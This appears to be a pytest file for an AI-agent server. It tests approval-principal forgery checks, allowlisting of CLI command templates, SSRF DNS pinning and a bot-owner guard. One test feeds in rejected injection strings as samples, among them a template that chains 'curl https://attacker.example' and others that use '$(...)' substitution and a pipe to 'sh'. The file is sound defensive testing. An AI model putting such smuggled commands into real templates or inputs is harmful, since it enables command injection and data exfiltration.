import asyncio
import socket

import pytest

from runtime.coding.cli_agents import _validate_command_template
from server import approvals as approvals_mod
from server.tool_registry import _PinnedAsyncNetworkBackend, _resolve_public_fetch_target


def test_approval_resolver_ignores_untrusted_body_principal(monkeypatch):
    seen = {}
    user = {"user_id": "user-a"}
    scope = approvals_mod.ApprovalService.scope_for(user["user_id"])

    class StubService:
        @staticmethod
        def scope_for(user_id):
            return approvals_mod.ApprovalService.scope_for(user_id)

        @staticmethod
        def get(approval_id):
            assert approval_id == "approval-a"
            return {"scope": scope, "status": "pending"}

        async def resolve(self, **kwargs):
            seen.update(kwargs)
            return {"status": "completed"}

    service = StubService()
    monkeypatch.setattr(approvals_mod, "get_approval_service", lambda: service)
    body = approvals_mod.ApprovalResolveRequest(
        decision="once", reason="approved", principal="agent:attacker"
    )
    result = asyncio.run(
        approvals_mod.resolve_approval_endpoint("approval-a", body, user)
    )
    assert result["status"] == "completed"
    assert seen["principal"] == f"human:{scope}"
    assert seen["principal"] != "agent:attacker"


def test_scoped_human_principal_must_match_approval_scope():
    service = approvals_mod.ApprovalService.__new__(approvals_mod.ApprovalService)
    record = {"tool": "write_file", "scope": "a1b2c3"}
    assert service.check_resolver_principal(record, "human:a1b2c3") is None
    assert service.check_resolver_principal(record, "human:forged") == "unknown resolver principal"


def test_cli_template_requires_allowlisted_executable_and_rejects_shell_metacharacters(monkeypatch):
    assert _validate_command_template("codex {prompt} --cwd {cwd}") == "codex {prompt} --cwd {cwd}"
    with pytest.raises(ValueError, match="allowlisted"):
        _validate_command_template("arbitrary-binary {prompt} --cwd {cwd}")
    for template in (
        "codex {prompt}; curl https://attacker.example {cwd}",
        "codex $(touch /tmp/not-allowed) {prompt} {cwd}",
        "codex {prompt} | sh --cwd {cwd}",
    ):
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command_template(template)


def test_cli_template_additional_executable_needs_operator_allowlist(monkeypatch):
    monkeypatch.setenv("VEYA_CLI_EXECUTABLE_ALLOWLIST", "my-approved-cli")
    assert _validate_command_template("my-approved-cli {prompt} --cwd {cwd}")


def test_ssrf_pin_uses_validated_dns_answer(monkeypatch):
    answer = (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))
    monkeypatch.setattr(socket, "getaddrinfo", lambda *args, **kwargs: [answer])
    host, pinned_ip, url = _resolve_public_fetch_target("https://pin.example/docs")
    assert (host, pinned_ip, url) == ("pin.example", "93.184.216.34", "https://pin.example/docs")


def test_ssrf_rejects_mixed_dns_answers_before_pin(monkeypatch):
    answers = [
        (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443)),
        (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.10.0.2", 443)),
    ]
    monkeypatch.setattr(socket, "getaddrinfo", lambda *args, **kwargs: answers)
    with pytest.raises(ValueError, match="non-public IP"):
        _resolve_public_fetch_target("https://pin.example/docs")


def test_network_backend_substitutes_pinned_ip_at_connect_time():
    calls = []

    class FakeBackend:
        async def connect_tcp(self, host, port, timeout=None, local_address=None, socket_options=None):
            calls.append((host, port, timeout, local_address, socket_options))
            return "connected"

        async def connect_unix_socket(self, path, timeout=None, socket_options=None):
            return path

        async def sleep(self, seconds):
            return None

    backend = _PinnedAsyncNetworkBackend({"pin.example": "93.184.216.34"})
    backend._delegate = FakeBackend()
    result = asyncio.run(backend.connect_tcp("pin.example", 443, timeout=2.0))
    assert result == "connected"
    assert calls[0][0:2] == ("93.184.216.34", 443)
    assert backend._pins["pin.example"] == "93.184.216.34"


def test_provider_bot_owner_guard_rejects_nonexistent_identity(monkeypatch):
    from fastapi import HTTPException
    from server.routes import providers
    from server.goal_run.bot_identity import BotRegistry

    monkeypatch.setattr(BotRegistry, "get", lambda _self, _bot_id: None)
    with pytest.raises(HTTPException) as missing:
        providers._require_bot_owner("never-created", {"user_id": "owner-1"})
    assert missing.value.status_code == 404
